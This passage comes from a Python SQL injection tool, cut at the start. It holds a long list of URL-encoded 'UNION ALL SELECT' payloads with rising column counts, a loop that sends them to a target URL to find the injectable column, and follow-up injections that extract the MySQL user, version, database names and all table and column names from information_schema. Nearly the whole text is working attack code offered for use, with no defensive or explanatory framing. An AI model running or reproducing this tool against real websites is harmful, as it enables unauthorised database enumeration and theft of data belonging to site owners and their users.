                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50-- -',
                '%27 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51-- -',
            ]
            num = 0
            for payload in payloads:
              num += 1
              results = requests.get(URL + payload)
              if "The used SELECT" in results.text:
                pass
              else:
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Found Column : {num}")
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Start Get Back-End")
                count = num
                nums = [count for count in range(2, count+1)]
                for xem in nums:
                  payl = "(Select Group_Concat(database(),'::',version()))"
                  payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                  result = requests.get(URL + payls)
                  if "::" in result.text:
                    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Found Count Column : {xem}")
                    payl = "(Select Group_Concat(user(),'::',version()))"
                    payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                    get_html = requests.get(URL + payls)
                    html = get_html.text
                    dbms = r"\b\w+@\b\w+::\b"
                    find = re.findall(dbms, html)
                    print("---")
                    for dbms in find:
                      dbs = dbms.replace("::", "")
                      print("- User MySQL : {}".format(dbs))
                    payl = "(Select Group_Concat(database(),'::',version()))"
                    payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                    get_html = requests.get(URL + payls)
                    html = get_html.text
                    dbms = r"\b\w+::\b"
                    find = re.findall(dbms, html)
                    for dbms in find:
                      dbs = dbms.replace("::", "")
                      print("- Database : {}".format(dbs))
                      print("- Database : information_schema")
                    print("---")
                    payl = "(Select Group_Concat(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') From information_schema.columns)"
                    payls = re.sub(r"\b{}\b".format(xem), payl, payload)
                    get_html = requests.get(URL + payls)
                    html = get_html.text
                    dbms = r"\b\w+::\b\w+::\b"
                    find = re.findall(dbms, html)
                    co = 0
                    for dbms in find:
                      co += 1
                      dbs = dbms.replace("::", " | ")
                      print("- Database : {}".format(dbs))
                    print("---")
                    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Found : {co} database name")
                    exit()
                  else:
                    print("not found {}".format(xem))
    exploit()
else:
    print(f"{Fore.WHITE}{Back.RED}[FAILED]{Style.RESET_ALL} Not Found Number Method , Please Again..")
    pass
